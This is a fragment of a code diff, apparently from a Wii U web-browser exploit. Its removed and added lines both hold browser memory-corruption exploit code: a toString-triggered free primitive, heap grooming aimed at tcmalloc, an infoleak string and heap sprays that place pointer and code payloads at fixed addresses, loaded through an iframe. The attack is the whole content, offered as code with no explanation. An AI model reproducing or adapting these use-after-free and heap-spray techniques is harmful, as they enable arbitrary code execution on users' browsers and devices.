-  arr.push(overwrite_string);
-  for (var i = 0; i < 0x10000; i++) {
-    arr.push(long_string);
-  }
-}
-
-// Free primitive.
-var force_alloc_and_free = {
-  toString: build_arr
-};
-
-var force_arr = [];
-force_arr.push(force_alloc_and_free);
-for (var i = 1; i < 0x1A4/4; i++)
-{
-  force_arr.push('');
-}
-
-// Force allocations to trick tcmalloc.
-for(var i = 0; i < 1635; i++) {
-  holder.push(alloc(0x1A0 - 0x20, 1));
-}
-
-// Create link element.
-elem = document.createElement("link");
-
-// Allocate infoleak string.
-target = alloc(0x1A0 - 0x20, 2);
-
-// Allocate long string.
-long_string = alloc(0x10004, 6944); // Decimal of the half-address which is repeated. Ex: 0x1B20 = 0x1B201B20
-
-// Make and free 0x1A4 bytes.
-force_arr.join();
-
-var pointer = sprayInc(420);
-var code = sprayCode(300);
-
-arr.join();
-
-alert("Your Wii U is incompatible.");
-
-</script>
+            function dsm(evnt) {
+                // spray
+                var mem = [];
+                for (var j = 20; j < 2048; j++) sprayOne(mem, j, 0x1dd7b814);
+            }
+            var pointer = sprayInc(25000);
+            var code = sprayCode(300);
+        </script>
+    </head>
+    <body>
+        <iframe src="frame.html"></iframe>
+    </body>
+</html>
